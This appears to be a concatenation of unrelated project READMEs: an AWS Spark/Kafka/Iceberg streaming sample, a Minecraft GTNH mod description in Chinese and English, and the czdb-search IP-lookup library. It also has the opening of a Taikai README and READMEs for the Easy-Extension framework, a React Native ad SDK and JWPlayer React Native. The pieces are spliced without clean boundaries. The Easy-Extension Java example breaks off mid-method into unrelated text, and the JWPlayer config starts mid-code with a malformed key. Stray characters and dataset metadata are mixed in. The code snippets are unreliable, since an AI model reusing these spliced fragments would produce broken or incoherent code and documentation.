aws-samples/iceberg-streaming-examples,main,"# Streaming Apache Iceberg examples using Apache Spark
AWS Managed Kafka and Apache Kafka, a distributed event streaming platform, has become the de facto standard for building real-time data pipelines. However, ingesting and storing large amounts of streaming data in a scalable and performant manner can be complex and resource-intensive task, often leading to performance issues and increased costs.

This project covers  how open table formats, such as Apache Iceberg, can help address these challenges. It provides  a solution that combines the power of [Apache Kafka](https://kafka.apache.org/) , [Apache Spark](https://spark.apache.org/), and [Apache Iceberg](https://iceberg.apache.org/) to achieve high-throughput streaming ingestion

The focus in this repository is to go further than the typical poc consuming few messages or small csv files. The aim here is to provide support for around **400,000 msg/seg** on all scenarios. 

The concepts seen here are applicable to PySpark or Scala programs with little effort. Remember that we just program
the transformations and those are converted to a logical plan and then to native code via the Java Virtual Machine (JVM) or to native code using projects such as [Apache Data Fusion Comet](https://github.com/apache/datafusion-comet), [Velox](https://github.com/apache/datafusion-comet) or [Photon](https://www.databricks.com/product/photon).

Why Java? Because why not, remember that this nowadays gets executed by the JVM ( until previous projects arise). Remember that with this approach we can use libraries in an easy way ( without the Scala/Python/Java 'mess'), we can program performant UDFs and there is a friendly local development environment (where you can debug everything with breakpoints) with different options.

The example uses maven profiles to automatically filter required libraries when deployed to [Amazon EMR](https://aws.amazon.com/emr/) ( the Spark and Iceberg libraries will be marked as provided) and therefore you will be using the optimized Spark runtime from EMR. The logging is implemented using [Log4j2](https://logging.apache.org/log4j/2.12.x/) ( where its config can be further tuned using EMR Serverless configs) as Spark uses it behind the scenes. 

**Environment types:** 

- Local development using a [dockerized Kafka](https://github.com/bitnami/containers/blob/main/bitnami/kafka/).
- Local development against Amazon S3, and AWS Glue Catalog, here we will also use the dockerized Kafka.
- Production mode where we can deploy the code to an Amazon EMR Serverless cluster.

You can run these examples on any Spark compatible runtime too, but that's for a pull request ( if you like to contribute).

In the case of Amazon Web Services on AWS Glue, Amazon EMR or Amazon EMR Serverless.
æ
Remember also that these jobs and code can be adapted for **batch mode** easily (and remember that you can use Kafka as batch source!). A batch job is just a special streaming job with a start and an end anyway.

### A note on performance

Although the code here aims for performance more tuning can be done for achieving specific goals such as improving latency.

Remember that Apache Iceberg have merge-on-read capabilities. In this repo, the default settings for tables are used
but mixing copy-on-write with merge-on-read can lead to some gains as we will write faster.

Remember that this is not a free lunch, you will need to compact if you want good performance.

Another cool thing to test is to use Avro for the ingestion tables and then compact to parquet. 

A good doc to read about these settings and more can be seen on the [Best Practices for Optimizing Apache Iceberg workloads](https://docs.aws.amazon.com/prescriptive-guidance/latest/apache-iceberg-on-aws/best-practices.html) from AWS Documentation.

Another good read can be seen on this blog from Cloudera: [Optimization Strategies for Iceberg Tables](https://blog.cloudera.com/optimization-strategies-for-iceberg-tables/)

## IoT Scenarios

Here we have different approaches and comœmon formats. About the different scenarios the main idea is high throughput streaming
ingestion:
- Native Iceberg writing with deduplication via even-time watermarking.
- Custom process writing with compaction via n-batches and deduplication via merge into.
- Custom process writing with async compaction and Merge-on-read mode.

For the different formats we will have the native use case implemented and the ProtoBuf one will have all the scenarios.

The most advanced example using Protocol Buffers is in ```com.aws.emr.spark.iot``` package.

Later on a job rewriting older partitions to check for duplicates are found and rewrite affected partitions may run. 
An example of such approach can be seen also on the Utils class of ```com.aws.emr.spark.iot``` package.

Remember that exactly once systems are difficult to implement and that for Spark you will need and idempotent sink.

If you want to use the GlueSchemaRegistry you should create in the console a stream registry named ```employee-schema-registry```.

### Protocol Buffers

[Protocol Buffers](https://protobuf.dev/) are language-neutral, platform-neutral extensible mechanisms for serializing structured data.

**Examples**: 
- Native Java Producer/Consumer. 
- AWS Glue Registry based Java Producer/Consumer.
- Native Spark Structured streaming consumer. 
- UDF based Spark Structured streaming consumer.

Create a schema for the Glue registry ```Employee.proto``` if you like to use the Registry based producer/consumer:

```
syntax = ""proto3"";
package gsr.proto.post;

import ""google/protobuf/wrappers.proto"";
import ""google/protobuf/timestamp.proto"";

message Employee {
      int32 id = 1;
      string name = 2;
      string address = 3;
      google.protobuf.Int32Value employee_age = 4;
      google.protobuf.Timestamp start_date = 5;
     Team team = 6;
     Role role = 7;

}
message Team {
     string name = 1;
     string location = 2;
}
enum Role {
     MANAGER = 0;
     DEVELOPER = 1;
     ARCHITECT = 2;
}
```

### Apache Avro

[Apache Avro](https://avro.apache.org/) - a data serialization system.

**Examples**: 
- Native Java Producer/Consumer. 
- AWS Glue Registry based Java Producer/Consumer.
- Native Spark Structured streaming consumer. 

Create a schema for the Glue registry ```Employee.avsc``` if you like to use the Registry based producer/consumer:
```
{""namespace"": ""gsr.avro.post"",
 ""type"": ""record"",
 ""name"": ""Employee"",
 ""fields"": [
     {""name"": ""employee_id"", ""type"": ""long""},
     {""name"": ""age"",  ""type"": ""int""},
     {""name"": ""start_date"",   ""type"": ""long""},
   {""name"": ""team"", ""type"": ""string""},
   {""name"": ""role"", ""type"": ""string""},
   {""name"": ""address"", ""type"": ""string""},
   {""name"": ""name"", ""type"": ""string""}]
}
```

### Json

There is plenty of literature over the internet on how integrate Spark with Json data, therefore we just implemented one usecase.

**Examples**:
- AWS Glue Registry based Java Producer/Consumer.


Create a schema for the Glue registry ```Employee.json``` if you like to use the Registry based producer/consumer:
```
{
  ""$id"": ""https://example.com/Employee.schema.json"",
  ""$schema"": ""http://json-schema.org/draft-07/schema#"",
  ""title"": ""Employee"",
  ""description"": """",
  ""type"": ""object"",
  ""properties"": {
    ""employeeId"": {
      ""description"": ""The unique identifier for a employee"",
      ""type"": ""integer""
    },
    ""name"": {
      ""description"": ""Name of the employee"",
      ""type"": ""string""
    }
  }
}

```
## CDC Scenarios

Here the reference is Tabular [Apache Iceberg Cookbook](https://tabular.io/apache-iceberg-cookbook/) and these blogposts:
 - https://tabular.io/blog/hello-world-of-cdc/
 - https://tabular.io/blog/cdc-data-gremlins/#eventual-consistency-causes-data-gremlins
 - https://tabular.io/blog/cdc-merge-pattern/
 - https://tabular.io/blog/cdc-zen-art-of-cdc-performance/

Here we will focus on the Mirror MERGE patter, as stated in the Iceberg Cookbook the first part could be managed by 
the Kafka Connect Tabular connector, but we will implement both processing pipelines using Spark. 

The relevant classes are withing the ```com.aws.emr.spark.cdc``` package.  

 * ```KafkaCDCSimulator``` class is a Java producer simulating CDC data in [AWS Database Migration Service(DMS)](https://aws.amazon.com/es/dms/) format. 
 * ```SparkLogChange```  class is a Structured Streaming consumer that outputs a CDC changelog to an Iceberg table. 
 * ```SparkCDCMirror``` class is a Spark batch pipeline that process the MERGE using the Mirror approach.
 * ```SparkIncrementalPipeline``` class uses Incremental pipeline for consuming the CDC changelog into a target table. 

## Requirements

* Java 17 + ( you could adapt this code easily to run on Java 8 or Java 11)
* Maven 3.9+
* 16GB of RAM and more than 2 cores. 
* Whatever IDE you like ([Intellij](https://www.jetbrains.com/intellij/), [Visual Studio Code](https://code.visualstudio.com/), [NetBeans](https://apache.netbeans.org/), etc)

For local development and testing you can use the provided ```docker-compose.yml``` to spin up a Kafka cluster.

You can generate the description file using the protobuf compiler like this. You need to install the protobuf compiler for your system, for example on MacOs is available on ```brew```. 

```protoc --include_imports --descriptor_set_out=Employee.desc Employee.proto'```

Remember that for simple scenarios you will be better suited using [Kafka Connect Tabular Iceberg Connector](https://github.com/tabular-io/iceberg-kafka-connect/tree/main) or using [Amazon Kinesis Firehose](https://aws.amazon.com/firehose/).

### Running on EMR Serverless:

Create a S3 bucket with the following structure. 

```
s3bucket/
	/jars
	/employee.desc -- or your custom protocol buffers descriptors
	/warehouse
	/checkpoint
```

Package your application using the ```emr``` Maven profile, then upload the jar of the project to the ```jars``` folder. The ```warehouse``` will be the place where the Iceberg Data and Metadata will live and ```checkpoint``` will be used for Structured Streaming checkpointing mechanismn. 
 
Create a Database in the AWS Glue Data Catalog with the name ```bigdata```.

You need to create an EMR Serverless application with ```default settings for batch jobs only```, application type ```Spark``` release version ```7.2.0``` and ```x86_64``` as architecture, enable ```Java 17``` as runtime, enable ```AWS Glue Data Catalog as metastore```
integration and enable ```Cloudwatch logs``` if desired.

Then you can issue a job run using this aws cli command. Remember to change the desired parameters.

```
aws emr-serverless start-job-run     --application-id application-identifier     --name job-run-name     --execution-role-arn arn-of-emrserverless-role --mode 'STREAMING'     --job-driver
	'{
        ""sparkSubmit"": {
            ""entryPoint"": ""s3://s3bucket/jars/streaming-iceberg-ingest-1.0-SNAPSHOT.jar"",
            ""entryPointArguments"": [""true"",""s3a://s3bucket/warehouse"",""/home/hadoop/Employee.desc"",""s3a://s3bucket/checkpoint"",""kafkaBootstrapString"",""true""],
            ""sparkSubmitParameters"": ""--class com.aws.emr.spark.iot.SparkCustomIcebergIngest --conf spark.executor.cores=4 --conf spark.hadoop.hive.metastore.client.factory.class=com.amazonaws.glue.catalog.metastore.AWSGlueDataCatalogHiveClientFactory --conf spark.executor.memory=16g  --conf spark.driver.cores=2 --conf spark.driver.memory=8g  --files s3a://s3bucket/Employee.desc --conf spark.dynamicAllocation.minExecutors=4 --conf spark.jars=/usr/share/aws/iceberg/lib/iceberg-spark3-runtime.jar --conf spark.emr-serverless.executor.disk.type=shuffle_optimized --packages org.apache.spark:spark-sql-kafka-0-10_2.12:3.5.1""
        }
    }'
{	
```

Expected performance should be around 450.000 msgs per sec if you use the ```SparkCustomIcebergIngest```.

<img src=""imgs/emr_performance.png"" align=""center"" height=""450"" width=""600""/>

You can also see the cluster autoscaling into action:

<img src=""imgs/emr_cluster_autoscaling.png"" align=""center"" height=""470"" width=""550""/>

### Running on a local environment.

1. Install a Java SDK 17 like [Amazon Coretto](https://aws.amazon.com/corretto/).
2. Install [Docker](https://www.docker.com/) for your environment. 
3. Open the desired IDE. 
4. Use the IDE to issue the ```package ``` command of maven selecting the local profile.
5. If you wish to use the AWS Glue Data Catalog and S3 remember to have the corresponding permissions (have your AWS credentials avaliable), there are plugins for both [Intellij](https://aws.amazon.com/intellij/?pg=developertools) and [Visual Studio Code](https://aws.amazon.com/visualstudiocode/) that can be helpful here.
6. Start the local Kafka broker via ```docker-compose up``` command.
7. Run the examples with the desired arguments, remember that you will need to add the required VM options for letting Spark to work on Java 17: 
```
--add-opens=java.base/java.lang=ALL-UNNAMED
--add-opens=java.base/java.lang.invoke=ALL-UNNAMED
--add-opens=java.base/java.lang.reflect=ALL-UNNAMED
--add-opens=java.base/java.io=ALL-UNNAMED
--add-opens=java.base/java.net=ALL-UNNAMED
--add-opens=java.base/java.nio=ALL-UNNAMED
--add-opens=java.base/java.util=ALL-UNNAMED
--add-opens=java.base/java.util.concurrent=ALL-UNNAMED
--add-opens=java.base/java.util.concurrent.atomic=ALL-UNNAMED
--add-opens=java.base/sun.nio.ch=ALL-UNNAMED
--add-opens=java.base/sun.nio.cs=ALL-UNNAMED
--add-opens=java.base/sun.security.action=ALL-UNNAMED
--add-opens=java.base/sun.util.calendar=ALL-UNNAMED
--add-opens=java.security.jgss/sun.security.krb5=ALL-UNNAMED
```

### Running the Kafka producer on AWS

Create a Amazon MSK cluster with at leas two brokers using ```3.5.1```, [Apache Zookeeper](https://zookeeper.apache.org/) mode version and use as instance type ```kafka.m7g.xlarge```. Do not use public access and choose two private subnets to deploy it. For the security group remember that the EMR cluster and the EC2 based producer will need to reach the cluster and act accordingly. For security, use ```PLAINTEXT``` (in production you should secure access to the cluster). Choose ```200GB``` as storage size for each broker and do not enable ```Tiered storage```. For the cluster configuration use this one:

```
auto.create.topics.enable=true
default.replication.factor=3
min.insync.replicas=2
num.io.threads=8
num.network.threads=5
num.partitions=32
num.replica.fetchers=2
replica.lag.time.max.ms=30000
socket.receive.buffer.bytes=102400
socket.request.max.bytes=104857600
socket.send.buffer.bytes=102400
unclean.leader.election.enable=true
zookeeper.session.timeout.ms=18000
compression.type=zstd
log.retention.hours=2
log.retention.bytes=10073741824
```

Running the Kafka producer on an Amazon EC2 instance, remember to change the bootstrap connection string.

You will need to install Java if you are using and Amazon Linux instance. 
```
sudo yum install java-17-amazon-corretto-devel
```
Then, download the jar to the instance and execute the producer. With the following command you can start the Protocol Buffers Producer.
```
aws s3 cp s3://s3bucket/jars/streaming-iceberg-ingest-1.0-SNAPSHOT.jar .
java -cp streaming-iceberg-ingest-1.0-SNAPSHOT.jar com.aws.emr.proto.kafka.producer.ProtoProducer kafkaBoostrapString
```

Remember that your EC2 instance need to have network access to the MSK cluster, you will need to configure the VPC, Security Groups and Subnet/s. 

## Costs

Remember that this example is for high throughput scenarios and therefore the config may lead to quite big bill if deployed on top of AWS, remember to stop the EMR Serverless application, the used instance for the Kafka producer and delete the Amazon MSK cluster when not in use.

## Security

The code here is not secured in any way, you should secure your Apache Kafka cluster and be aware that some dependencies may have known vulnerabilities. If you deploy any service on top of AWS you should configure the roles using the least permission model
using [IAM roles](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html) and [Amazon Lake Formation](https://aws.amazon.com/lake-formation/) if needed.

作者：Imgood  
模组描述： 
HyperdimensionalTech 是一个以超维度科技为主题的模组。背景设定在一个多维度的宇宙中，通过使用多维度科技来获取和加工资源。  
模组中各种终极科技主要来源：某个维度里存在着具备极高科技水平的硅基生物原住民，他们实现了真正意义上的机械飞升，所有原住民都汇聚成了一个整体意识。在文明的发展过程中，他们不断复制自身，掌握了空间压缩技术、反物质产能技术、零点能发电技术、质量湮灭发电技术等先进技术。他们成功避免了宇宙的最终归宿——大热寂，并通过空间压缩技术将维度内的所有空间压缩到奇点级的密度，填充在机械体内。  
玩家需要做的：在GTNH世界中，开发出机器，从多元维度中挖掘出物质。例如，在机械维度中可以挖掘出机械奇点并将其解压，以此获取GTNH世界中任意阶段的机械部件、芯片、处理器、AE存储元件等。  
模组中不仅包含机械维度，还设想了许多其他奇特的空想维度。例如： 

美食维度：这个维度充满了各种美食资源，玩家可以采集美食资源。 

植物维度：充满巨大奇异植物的维度，玩家可以在这里收集到稀有的生命资源。这个维度中的植物具有自我修复和繁殖的能力，玩家可以在这获取无限的生物资源。 

机械维度：完全由高科技建筑和装置组成的维度，玩家可以在这里找到先进的科技资源和组件。这些资源可以用于提升现有机器的效率，或者制造出全新的高科技设备。 

超维空间：所有维度与维度之间的边缘领域，是一个真实可以进入的世界，世界构造为正方形分形结构，特定机器只有在此维度才能工作。 

目标： 
模组旨在简化后期材料的复杂合成工序。通常，一个AE下单可能涉及几十甚至上百上千的工序，该模组希望将这些工序简化为几个步骤，从而减少服务器或客户端的性能占用。此外，模组中的机器设计非常独特，通常是巨大的且具有炫酷科幻外观，以满足建筑审美需求。模组可能会通过Mixin对GTNH原版内容进行改动，增加一些额外的建筑方块用于机器结构，并计划增加多种方块变种来支持斜坡的CTM（伪）。 

作者留言： 
我很高兴大家能在我的模组中添加新内容。我在开发这个模组时也学习了其他模组的代码（如TST、Chisel等）。在添加你的内容前，请确保你的设计符合模组的初衷。如果你的机器结构不符合本模组的审美设计，那肯定是不允许的。我可以为你重新设计结构。

Mod Name: HyperdimensionalTech  
Author: Imgood  

Module Description:  
HyperdimensionalTech is a module themed around hyperdimensional technology. Set in a multidimensional universe, it utilizes hyperdimensional technology to acquire and process resources.  

Sources of Various Ultimate Technologies in the Module:  
In a certain dimension, there exist silicon-based indigenous beings with extremely high technological levels. They have achieved true mechanical ascension, merging all inhabitants into a unified consciousness. Throughout their civilization’s development, they continuously replicated themselves, mastering technologies such as space compression, antimatter production, zero-point energy generation, and mass annihilation power generation. They successfully avoided the universe’s ultimate fate—the heat death—and used space compression technology to compress all the dimension’s space into singularity-level density, filling it within mechanical bodies.

What Players Need to Do:  
In the GTNH world, players need to develop machines to extract materials from multiple dimensions. For example, in the Mechanical Dimension, players can excavate mechanical singularities and decompress them to obtain mechanical components, chips, processors, AE storage elements, etc., for any stage of the GTNH world.  

The module not only includes the Mechanical Dimension but also envisions many other fantastical dimensions, such as:  

Gourmet Dimension: This dimension is filled with various food resources that players can gather.  

Plant Dimension: A dimension filled with giant exotic plants, where players can collect rare life resources. The plants in this dimension have self-repair and reproduction abilities, allowing players to obtain infinite biological resources.  

Mechanical Dimension: A dimension entirely composed of high-tech buildings and devices, where players can find advanced technological resources and components. These resources can be used to enhance the efficiency of existing machines or to create entirely new high-tech equipment.  

Hyperdimensional Space: The boundary area between all dimensions, a truly accessible world constructed in a square fractal structure. Specific machines can only operate in this dimension.  

Objective:  
The module aims to simplify the complex synthesis processes of late-game materials. Typically, an AE order might involve dozens or even hundreds of steps; this module hopes to reduce these steps to a few, thereby decreasing server or client performance usage. Additionally, the machines in the module are uniquely designed, usually large with a cool sci-fi appearance, meeting architectural aesthetic needs. The module may make changes to GTNH vanilla content via Mixin, adding extra building blocks for machine structures and planning to introduce various block variants to support slope CTM (pseudo).  

Author’s Note:  
I am delighted for everyone to add new content to my module. I also learned from the codes of other modules (such as TST, Chisel) while developing this one. Before adding your content, please ensure your design aligns with the module’s original intent. If your machine structure does not match the aesthetic design of this module, it will not be allowed. I can redesign the structure for you.

tagphi/czdb-search-java,main,"# czdb-search 使用指南

czdb-search 是一个用于在纯真(CZ88)IP库中搜索数据的类。它支持三种类型的搜索算法：内存搜索（MEMORY）和B树搜索（BTREE）。数据库类型（IPv4或IPv6）和查询类型（MEMORY、BTREE）在运行时确定。

## Maven 依赖

如果你想在你的Maven项目中使用`czdb-search`，请在你的`pom.xml`中添加以下依赖：

```xml
<dependency>
    <groupId>net.cz88</groupId>
    <artifactId>czdb-search</artifactId>
    <version>${cz88db.version}</version>
</dependency>
```
请替换`${cz88db.version}`为你想要使用的版本。目前最新的版本是`1.0.2.5`。

## 支持 IPv4 和 IPv6

czdb-search 支持 IPv4 和 IPv6 地址的查询。在创建 DbSearcher 实例时，你需要提供相应的数据库文件和密钥。

数据库文件和密钥可以从 [www.cz88.net](https://cz88.net/geo-public) 获取。

## 如何使用

首先，你需要创建一个 DbSearcher 的实例。在创建实例时，你需要提供数据库文件的路径、查询类型和用于解密数据库的密钥。

```java
DbSearcher searcher = new DbSearcher(""数据库文件路径"", QueryType.MEMORY, ""密钥"");
```

然后，你可以使用 `search` 方法来根据提供的 IP 地址在数据库中搜索数据。

```java
String region = searcher.search(""IP地址"");
```

如果搜索成功，`search` 方法将返回找到的数据块的区域。如果搜索失败，它将返回 null。

返回的字符串格式为 ""国家–省份–城市–区域 ISP""。例如，对于一个位于中国上海市虹口区的IP地址，返回的字符串可能是 ""中国–上海–上海–虹口区 电信""。如果搜索失败，它将返回 null。

## 查询类型

DbSearcher 支持2种查询类型：MEMORY 和 BTREE。

- MEMORY：此模式是线程安全的，将数据存储在内存中。
- BTREE：此模式使用 B-tree 数据结构进行查询。它不是线程安全的。不同的线程可以使用不同的查询对象。

你可以在创建 DbSearcher 实例时选择查询类型。

```java
DbSearcher searcher = new DbSearcher(""数据库文件路径"", QueryType.BTREE, ""密钥"");
```

## 线程安全

请注意，只有 MEMORY 查询模式是线程安全的。如果你在高并发环境下使用 BTREE 查询模式，可能会导致打开的文件过多的错误。在这种情况下，你可以增加内核中允许打开的最大文件数（fs.file-max），或者使用 MEMORY 查询模式。当然更合理的一个方式是为线程池中的每一个线程只创建一个DbSearcher实例。

## 关闭数据库

当查询结束时，你应该关闭数据库。注意**并不是说**每次查询都需要创建DbSearcher实例查完后关闭，如果是为每个线程创建一个DbSearcher实例，那么只有在线程结束时才需要关闭数据库。

```java
searcher.close();
```

这将释放所有使用的资源，并关闭对数据库文件的访问。

## 如何进行查询测试

我们提供了一个名为 `SearcherTest` 的类，你可以通过命令行来使用它进行查询测试。以下是如何使用的说明：

首先，你需要从 GitHub 的 release 中下载 `czdb-search-1.0.jar` 文件。你可以点击[这里](https://github.com/tagphi/czdb-search-java/releases)下载。

然后，你可以运行 `SearcherTest`。它需要三个参数：

- `-d` 或 `--dbFilePath`：数据库文件的路径。
- `-t` 或 `--queryType`：查询类型。有效的类型有 `MEMORY` 和 `BTREE`。
- `-k` 或 `--key`：用于解密数据库文件的密钥。

以下是一个运行 `SearcherTest` 的示例命令：

```bash
java -cp czdb-search-1.0.2.3.jar net.cz88.czdb.SearcherTest -d your-db-file-path -t MEMORY -k your-key
```

请将 your-db-file-path 和 your-key 替换为实际的值。  在运行 SearcherTest 后，你可以输入 IP 地址进行查询，或输入 'q' 退出程序。

## 性能测试
做性能测试，需要额外提供两个参数:

- `-b` 表示进行性能测试
- `-i` 待查询的IP地址文件路径。文件格式为
```text
开始ip\t结束ip
```

程序会每行抽取一个ip查询，查询完后打印查询时间，查询次数和QPS。",6,3,2,apache-2.0,1.0

# Taikai

Taikai extends the capabilities of the popular ArchUnit library by offering a comprehensive suite of predefined rules tailored for various technologies. It simplifies the enforcement of architectural constraints and best practices in your codebase, ensuring consistency and quality across your projects.

## Maven Usage

Add Taikai as a dependency in your `pom.xml`:

```xml
<dependency>
  <groupId>com.enofex</groupId>
  <artifactId>taikai</artifactId>
  <version>${taikai.version}</version>
  <scope>test</scope>
</dependency>
```

Replace `${taikai.version}` with the appropriate version defined in your project. Ensure that the required dependencies like ArchUnit are already declared.

## Gradle Usage

Add Taikai as a dependency in your `build.gradle` file:

```groovy
testImplementation ""com.enofex:taikai:${taikaiVersion}""
```

Replace `${taikaiVersion}` with the appropriate version defined in your project. Ensure that the required dependencies like ArchUnit are already declared.

## JUnit 5 Example Test

Here's an example demonstrating the usage of some Taikai rules with JUnit 5. Customize rules as needed using `TaikaiRule.of()`.

xiaoshicae/easy-extension,main,"# Easy-Extension
Easy-Extension框架目标是提高`复杂系统的扩展性`，适用于系统有多个接入方，且不同接入方有定制化的扩展诉求。例如电商交易，履约等中台系统。

# 框架特点
* 轻量易用
* 可以实现业务逻辑和平台逻辑分离，提高提供扩展性和稳定性

# 框架解决的业务场景
![](/doc/target.png)

# 框架使用Demo
```java
@RestController
@RequestMapping(""/api"")
public class Controller {
    // 动态注入扩展点1，不同业务和能力会有不同实现
    // 会根据匹配到的业务和挂载的扩展点，注入优先级最高的实现
    // 未匹配到任何业务和能力的实现，会走默认能力进行兜底
    @ExtensionInject
    private Ext1 ext1;

    // 动态注入扩展点2，不同业务会和能力有不同实现
    // 会根据匹配到的业务和挂载的扩展点，注入优先级最高的实现
    // 未匹配到任何业务和能力的实现，会走默认能力进行兜底
    @ExtensionInject
    private Ext2 ext2;

    // 动态注入扩展点3，不同业务会和能力有不同实现
    // 会根据匹配到的业务和挂载的扩展点，注入所有匹配到的实现
    // 包括默认能力
    @ExtensionInject
    private List<Ext3> ext3List;

    @RequestMapping(""/process"")
    public String process() {
        String s1 = ext1.doSomething1();
        String s2 = ext2.doSomething2();
        List<String> s3List = new ArrayList<>();
        for (Ext3 ext3 : ext3List) {
            s3List.add(ext3.doSomething3());
        }
        return String.format(""res: ext1 = %s, ext2 = %s, ext3List = %s"", s1, s2, Arrays.toString(s3List));

接入穿山甲SDK

## 后期代办
接入GeoMoreSdk

## 安装

```sh
npm install react-native-brayant-ad
```

在RN项目的 Project级别的 build.gradle 中添加如下配置 （android/build.gradle）
```
allprojects {
  repositories {
    google()
    mavenCentral()
    // 添加穿山甲SDK仓库
    maven {
      url 'https://artifact.bytedance.com/repository/pangle'
    }
  }
}
```

## 必要配置
在项目入口文件中初始化init, 如果不是全局初始化的就需要在每次调用的时候传入
```js
import { init } from 'react-native-brayant-ad';

useEfect(() => {
  init({
    appid: ""xxxx"",
    app: ""app名称"",
    amount: 1000,
    reward: ""金币"",
    debug: true
  }).then((res) => {})
})

```

  import JWPlayer, { JWPlayerState } from '@jwplayer/jwplayer-react-native';

  ...

  const styles = StyleSheet.create({
    container: {
      flex: 1,
    },
    player: {
      flex: 1,
    },
  });

  ...

  const playlistItem = {
    title: 'Track',
    mediaId: -1,
    image: 'http://image.com/image.png',
    description: 'My beautiful track',
    startTime: 0,
    file: 'http://file.com/file.mp3',
    tracks: [
      {
        file: 'http://file.com/english.vtt',
        label: 'en',
        default: true
      },
      {
        file: 'http://file.com/spanish.srt',
        label: 'es'
      }
    ],
    sources: [
      {

        : 'YOUR_IOS_SDK_KEY',
    backgroundAudioEnabled: true,
    autostart: true,
    styling: { // only (mostly) compatible with iOS
      colors: {
        timeslider: {
          rail: ""0000FF"",
        },
      },
    },
    playlist: [playlistItem],
  }

  ...

  async isPlaying() {
    const playerState = await this.JWPlayer.playerState();
    return playerState === JWPlayerState.JWPlayerStatePlaying;
  }

  ...

  render() {

  ...

  <View style={styles.container}>
    <JWPlayer
      ref={p => (this.JWPlayer = p)}
      style={styles.player}
      config={config}
      onBeforePlay={() => this.onBeforePlay()}
      onPlay={() => this.onPlay()}
      onPause={() => this.onPause()}
      onIdle={() => console.log(""onIdle"")}
      onPlaylistItem={event => this.onPlaylistItem(event)}
      onSetupPlayerError={event => this.onPlayerError(event)}
      onPlayerError={event => this.onPlayerError(event)}
      onBuffer={() => this.onBuffer()}
      onTime={event => this.onTime(event)}
      onLoaded={event => this.onLoaded(event)}
      onFullScreen={() => this.onFullScreen()}
      onFullScreenExit={() => this.onFullScreenExit()}
    />
  </View>

  ...

  }
  ```


2. Define `config.license` with your Android or iOS JWP license key.
3. Define `config.playlist` with the media to play in the player.
4. (Optional) Define the other values of the `config` prop.

<br />

ℹ️ See [Props](/docs/props.md) for all the available `config` prop fields.

ℹ️ See [Legacy Readme](/docs/legacy_readme.md) for all the available `config` prop fields when using a legacy configuration.

<br />

## Advanced Topics

[Advertising](#advertising) | [Background Audio](#background-audio) | [Casting](#casting) | [DRM](#drm) | [Picture in Picture (PiP)](#picture-in-picture-pip) | [Styling](#styling)

<br />

### Advertising

[Android](#android-advertising) | [iOS](#ios-advertising)

#### Android Advertising

Follow this step to set up advertising with IMA or DAI:

1. In the **app/build.gradle** `ext{}`, add `RNJWPlayerUseGoogleIMA = true`. This setting will add the following dependencies: `com.google.ads.interactivemedia.v3:interactivemedia:3.31.0` and `com.google.android.gms:play-services-ads-identifier:18.0.1`.

<br />

#### iOS Advertising

Follow this step to set up advertising with IMA or DAI:

1. In the **Podfile** `ext{}`, add `$RNJWPlayerUseGoogleIMA = true`. This setting will add `GoogleAds-IMA-iOS-SDK` to the pod.

<br /><br />

### Background Audio

Background Audio allows your viewers to play audio while they are no longer actively using your app or have locked their device.

Follow these steps to enable background audio sessions:

1. Set `backgroundAudioEnabled` to `true` in the `config`.
2. Ensure that background audio is set for [Android](https://docs.jwplayer.com/players/docs/android-enable-background-audio) or [iOS](https://docs.jwplayer.com/players/docs/ios-player-backgrounding-reference#configure-audio-playback).

<br /><br />

### Casting

[Android](#android-casting) | [iOS](#ios-casting)

JWP enables casting by default with a casting button.

<br />

#### Android Casting

Follow these steps to enable casting:

1. In **app/build.gradle** in `ext{}`, add `RNJWPlayerUseGoogleCast = true`.
2. In **app/build.gradle**, add `com.google.android.gms:play-services-cast-framework:21.3.0`.
3. Create a class that overrides `OptionsProvider` in your Android codebase:
   1. See the reference file **android/src/main/java/com/appgoalz/rnjwplayer/CastOptionsProvider.java**.
   2. Replace `.setTargetActivityClassName(RNJWPlayerView.class.getName())` with your player Activity.
   3. Modify the file with any options necessary for your use case.
4. Add the `meta-data` to your **AndroidManifest.xml**.

   ```xml
    <meta-data
        android:name=""com.google.android.gms.cast.framework.OPTIONS_PROVIDER_CLASS_NAME""
        android:value=""path.to.CastOptionsProvider"" />
   ```

<br />

#### iOS Casting

Follow these steps to enable casting:

1. [Enable casting to Chromecast devices](https://docs.jwplayer.com/players/docs/ios-enable-casting-to-chromecast-devices).
2. Add `$RNJWPlayerUseGoogleCast = true` to your **Podfile**. This setting will install `google-cast-sdk` pod.
3. Edit **Info.plist** with the following values.

  ```text
  'NSBluetoothAlwaysUsageDescription' => 'We will use your Bluetooth for media casting.',
  'NSBluetoothPeripheralUsageDescription' => 'We will use your Bluetooth for media casting.',
  'NSLocalNetworkUsageDescription' => 'We will use the local network to discover Cast-enabled devices on your WiFi network.',
  'Privacy - Local Network Usage Description' => 'We will use the local network to discover Cast-enabled devices on your WiFi network.'
  'NSMicrophoneUsageDescription' => 'We will use your Microphone for media casting.'
  ```

<br />

| Available Method | Description |
| --- | --- |
| `castState(GCKCastState)` | Gets the cast state<br />See: [GCKCastState](#gckcaststate) |

##### GCKCastState

```text
typedef NS_ENUM(NSUInteger, GCKCastState) {
  /** No Cast session is established, and no Cast devices are available. */
  GCKCastStateNoDevicesAvailable = 0,
  /** No Cast session is establishd, and Cast devices are available. */
  GCKCastStateNotConnected = 1,
  /** A Cast session is being established. */
  GCKCastStateConnecting = 2,
  /** A Cast session is established. */
  GCKCastStateConnected = 3,
};
```

<br /><br />

### DRM

Enable digital rights management (DRM) protected playback.

💡 Check out the **DRMExample** in the **Example** app. The **DRMExample** cannot be run in the Simulator. Additionally, the window will not show on an Android Emulator.

<br />

#### Android DRM

Only Widevine is supported.

Follow these steps to enable DRM:
1. Set up your Android app for [DRM playback](https://developer.jwplayer.com/jwplayer/docs/android-play-drm-protected-content).
2. Define `config.playlist` with the [JWP signed URL](https://docs.jwplayer.com/platform/docs/protection-studio-drm-generate-a-signed-content-url-for-drm-playback) of the media to play in the player.

*❗️DO NOT sign and store your API secerets from your application.❗️*

If you use a different provider for DRM or this does not work for your use case, conforming to a similiar format as a JWP signed URL response is optimal, such as adding the `drm` field to the `sources` for a playlist item).

<br />

#### iOS DRM

Only Fairplay is supported.

The below is currently not fully supported by the iOS SDK, so please refer to `Example` app, or the [legacy DRM documentation](docs/legacy_readme.md#drm). For now, you must still provide the DRM asset in the `config.playlist` as a legacy object `[{fairplayCertUrl: string,processSpcUrl: string,file: string}]`

> Follow these steps to enable DRM:

<br /><br />

### Picture in Picture (PiP)

[Android](#android-pip) | [iOS](#ios-pip)

#### Android PiP

1. Read and understand the requirements for PiP in the [Android SDK](https://docs.jwplayer.com/players/docs/android-invoke-picture-in-picture-playback).
2. In the activity where the player is embedded, add the following code.
   ```java
